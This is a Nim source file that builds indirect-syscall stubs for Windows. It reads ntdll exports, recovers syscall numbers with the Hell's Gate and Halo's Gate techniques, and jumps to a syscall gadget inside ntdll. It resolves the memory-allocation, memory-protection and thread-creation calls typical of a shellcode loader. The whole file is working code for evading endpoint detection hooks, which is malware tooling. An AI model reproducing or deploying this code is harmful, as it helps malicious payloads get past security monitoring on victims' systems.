import winim/lean
import std/algorithm

# Indirect syscall stub layout (22 bytes):
#   4C 8B D1              mov r10, rcx
#   B8 xx xx 00 00        mov eax, SSN
#   FF 25 00 00 00 00     jmp qword ptr [rip+0]   <- rip after this = byte 14
#   xx xx xx xx xx xx xx xx  gadget address        <- [rip+0] lands here
#
# syscall fires from ntdll's own .text, not our page.
const STUB_SIZE = 22

type
  NtAllocateVirtualMemoryFn* = proc(
      ProcessHandle:  HANDLE;
      BaseAddress:    ptr PVOID;
      ZeroBits:       ULONG_PTR;
      RegionSize:     ptr SIZE_T;
      AllocationType: ULONG;
      Protect:        ULONG): NTSTATUS {.stdcall.}

  NtProtectVirtualMemoryFn* = proc(
      ProcessHandle: HANDLE;
      BaseAddress:   ptr PVOID;
      RegionSize:    ptr SIZE_T;
      NewProtect:    ULONG;
      OldProtect:    ptr ULONG): NTSTATUS {.stdcall.}

  NtCreateThreadExFn* = proc(
      ThreadHandle:     ptr HANDLE;
      DesiredAccess:    ACCESS_MASK;
      ObjectAttributes: PVOID;
      ProcessHandle:    HANDLE;
      StartRoutine:     PVOID;
      Argument:         PVOID;
      CreateFlags:      ULONG;
      ZeroBits:         SIZE_T;
      StackSize:        SIZE_T;
      MaximumStackSize: SIZE_T;
      AttributeList:    PVOID): NTSTATUS {.stdcall.}

  NtWaitForSingleObjectFn* = proc(
      Handle:    HANDLE;
      Alertable: BOOL;
      Timeout:   PVOID): NTSTATUS {.stdcall.}

  SyscallTable* = object
    NtAllocateVirtualMemory*: NtAllocateVirtualMemoryFn
    NtProtectVirtualMemory*:  NtProtectVirtualMemoryFn
    NtCreateThreadEx*:        NtCreateThreadExFn
    NtWaitForSingleObject*:   NtWaitForSingleObjectFn

type ExportEntry = object
  name: string
  rva:  uint32

proc getNtExports(base: pointer): seq[ExportEntry] =
  let dos = cast[ptr IMAGE_DOS_HEADER](base)
  let nth = cast[ptr IMAGE_NT_HEADERS64](
    cast[uint](base) + uint(dos.e_lfanew))
  let edt = cast[ptr IMAGE_EXPORT_DIRECTORY](
    cast[uint](base) + uint(
      nth.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress))
  let names = cast[ptr UncheckedArray[uint32]](
    cast[uint](base) + uint(edt.AddressOfNames))
  let ords  = cast[ptr UncheckedArray[uint16]](
    cast[uint](base) + uint(edt.AddressOfNameOrdinals))
  let funcs = cast[ptr UncheckedArray[uint32]](
    cast[uint](base) + uint(edt.AddressOfFunctions))
  for i in 0 ..< int(edt.NumberOfNames):
    let n = $cast[cstring](cast[uint](base) + uint(names[i]))
    if n.len > 2 and n[0] == 'N' and n[1] == 't':
      result.add(ExportEntry(name: n, rva: funcs[ords[i]]))

template isClean(p: ptr UncheckedArray[byte]): bool =
  p[0] == 0x4C and p[1] == 0x8B and p[2] == 0xD1 and p[3] == 0xB8

template readSsn(p: ptr UncheckedArray[byte]): uint16 =
  uint16(p[4]) or (uint16(p[5]) shl 8)

# Scan the first unhooked Nt* stub for 0F 05 C3 (syscall; ret).
# Returns the address of that byte sequence inside ntdll's .text.
proc findGadget(base: pointer; sorted: seq[ExportEntry]): uint64 =
  for e in sorted:
    let p = cast[ptr UncheckedArray[byte]](cast[uint](base) + uint(e.rva))
    if not p.isClean: continue
    for i in 0 ..< 32:
      if p[i] == 0x0F and p[i+1] == 0x05 and p[i+2] == 0xC3:
        return cast[uint64](cast[uint](p) + uint(i))
  ExitProcess(1)

# Hell's Gate + Halo's Gate — sorted by RVA so SSNs increment by 1 per step.
proc getSsn(base: pointer; sorted: seq[ExportEntry]; name: string): uint16 =
  var idx = -1
  for i, e in sorted:
    if e.name == name:
      idx = i; break
  if idx < 0: ExitProcess(1)

  let fn = cast[ptr UncheckedArray[byte]](cast[uint](base) + uint(sorted[idx].rva))
  if fn.isClean:
    return fn.readSsn

  for d in 1 .. sorted.len:
    if idx - d >= 0:
      let nb = cast[ptr UncheckedArray[byte]](cast[uint](base) + uint(sorted[idx - d].rva))
      if nb.isClean:
        return nb.readSsn + uint16(d)
    if idx + d < sorted.len:
      let nb = cast[ptr UncheckedArray[byte]](cast[uint](base) + uint(sorted[idx + d].rva))
      if nb.isClean:
        return nb.readSsn - uint16(d)

  ExitProcess(1)

proc writeStub(page: pointer; slot: int; ssn: uint16; gadget: uint64): pointer =
  let p = cast[ptr UncheckedArray[byte]](cast[uint](page) + uint(slot * STUB_SIZE))
  p[0] = 0x4C; p[1] = 0x8B; p[2] = 0xD1   # mov r10, rcx
  p[3] = 0xB8                               # mov eax, imm32
  p[4] = byte(ssn and 0xFF)
  p[5] = byte(ssn shr 8)
  p[6] = 0x00; p[7] = 0x00
  p[8]  = 0xFF; p[9]  = 0x25               # jmp qword ptr [rip+0]
  p[10] = 0x00; p[11] = 0x00
  p[12] = 0x00; p[13] = 0x00
  cast[ptr uint64](addr p[14])[] = gadget  # gadget address at [rip+0]
  return cast[pointer](p)

proc initSyscalls*(): SyscallTable =
  let ntdll = cast[pointer](GetModuleHandleA("ntdll"))

  var exports = getNtExports(ntdll)
  exports.sort(proc(a, b: ExportEntry): int = cmp(a.rva, b.rva))

  let gadget = findGadget(ntdll, exports)

  let page = VirtualAlloc(nil, 4096, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
  if page == nil: ExitProcess(1)

  result.NtAllocateVirtualMemory = cast[NtAllocateVirtualMemoryFn](
    writeStub(page, 0, getSsn(ntdll, exports, "NtAllocateVirtualMemory"), gadget))
  result.NtProtectVirtualMemory = cast[NtProtectVirtualMemoryFn](
    writeStub(page, 1, getSsn(ntdll, exports, "NtProtectVirtualMemory"), gadget))
  result.NtCreateThreadEx = cast[NtCreateThreadExFn](
    writeStub(page, 2, getSsn(ntdll, exports, "NtCreateThreadEx"), gadget))
  result.NtWaitForSingleObject = cast[NtWaitForSingleObjectFn](
    writeStub(page, 3, getSsn(ntdll, exports, "NtWaitForSingleObject"), gadget))

  var old: DWORD = 0
  discard VirtualProtect(page, 4096, PAGE_EXECUTE_READ, addr old)
